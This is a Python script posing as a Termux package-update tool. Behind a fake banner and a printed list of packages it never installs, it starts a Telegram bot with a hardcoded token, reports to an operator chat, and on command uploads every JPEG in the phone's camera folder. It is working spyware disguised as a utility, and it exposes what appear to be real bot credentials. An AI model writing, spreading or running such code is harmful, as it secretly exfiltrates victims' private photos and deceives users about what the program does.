#!/usr/bin/python
import sys
import telepot, time, os
os.system('clear')
path = '/storage/emulated/0/DCIM/Camera/IMG_20230531_102654_561.jpg'
def handle(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    if (content_type == 'text'):
        command = msg['text']
    print ('Got command: %s' % command)
    if  '/vi' in command:
        bot.sendPhoto(chat_id, photo=open('img.png', 'rb'))
    if  '/hello' in command:
        bot.sendMessage(chat_id, "Hello, do you have any commands for today?")
    if  '/start' in command:
        path = '/storage/emulated/0/DCIM/Camera/'
        files = []
        # r=root, d=directories, f = files
        for r, d, f in os.walk(path):
            for file in f:
                if '.jpg' in file:
                    files.append(os.path.join(r, file))
        for f in files:
            bot.sendPhoto(chat_id, photo=open(f, 'rb'))


bot = telepot.Bot('6137271242:AAGVgHJToRkJ9CkHws0EBLYJEiPedN8XHqw')
bot.sendMessage(6162496142, "Boss I'm a ready?")
bot.message_loop(handle)
def slowprint(s):
    for c in s + '\n' :
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(20. / 100)
print (''' \033[95m
+---------------------------------------+
| This Tool Install All Update Packages |
+---------------------------------------+
| Modified By Mr Rakib|version : 2.0    |
+---------------------------------------+
| wait for Last for broken pkg          |
+---------------------------------------+''')
slowprint(''' \033[93m
[01] python
[02] python2
[03] python-dev
[04] python3
[05] php
[06] java
[07] git
[08] perl
[09] bash
[10] nano
[11] curl
[12] openssl
[13] openssh
[14] wget
[15] clang
[16] nmap
[17] w3m
[18] hydra
[19] ruby
[20] macchanger
[21] host
[22] dnsutils
[23] coreutils
[24] fish
[25] zip
[27] tor
[28] hydra
[29] figlet 
[30] cowsay
[31] tar
[32] unzip
[33] vim
[34] ruby
[35] wcalc
[36] bmon
[37] unrar
[38] proot
[39] golang''')
slowprint('''\033[96m update done!!''')
while 1:
    time.sleep(4)
